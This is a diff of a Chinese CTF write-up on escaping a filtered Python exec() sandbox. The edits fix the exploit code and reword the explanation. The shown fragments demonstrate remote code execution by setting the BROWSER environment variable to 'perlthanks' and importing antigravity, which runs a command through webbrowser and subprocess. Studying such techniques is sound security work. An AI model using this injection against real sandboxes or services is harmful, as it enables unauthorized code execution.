@@ -195,7 +195,7 @@ for c in 'h@"\'(_':
 exec(data)
 ```
 
-很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考[## HACKING WITH ENVIRONMENT VARIABLES](https://www.elttam.com/blog/env/)
+很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考[HACKING WITH ENVIRONMENT VARIABLES](https://www.elttam.com/blog/env/)
 
 我们这里先贴出最终的exp，然后再分析其原理:
 ```python
@@ -219,7 +219,7 @@ environ[{translate("BROWSER")}] = {translate("perlthanks")}
 import antigravity
 """ # exp
 
-normalize("NFKC", code)
+code = normalize("NFKC", code)
 
 for c in 'h"\'(@_':
     if c in code:
@@ -332,7 +332,7 @@ def register_standard_browsers():
                     register(cmdline, None, GenericBrowser(cmdline), preferred=True)
 ```
 
-`GenericBrowser.open()`函数是我们最终的目的，其实际上调用了`subprocess.open()`函数来实现使用浏览器打开的目的:
+`GenericBrowser.open()`函数是我们最终的目的，其调用了`subprocess.open()`函数:
 ```python
 class GenericBrowser(BaseBrowser):
     """Class for all browsers started with a command
@@ -388,7 +388,7 @@ environ[{translate("BROWSER")}] = {translate("perlthanks")}
 import antigravity
 """ # exp
 
-normalize("NFKC", code)
+code = normalize("NFKC", code)
 
 for c in 'h"\'(@_':
     if c in code:
@@ -397,5 +397,3 @@ for c in 'h"\'(@_':
 
 exec(code)
 ```
-
-
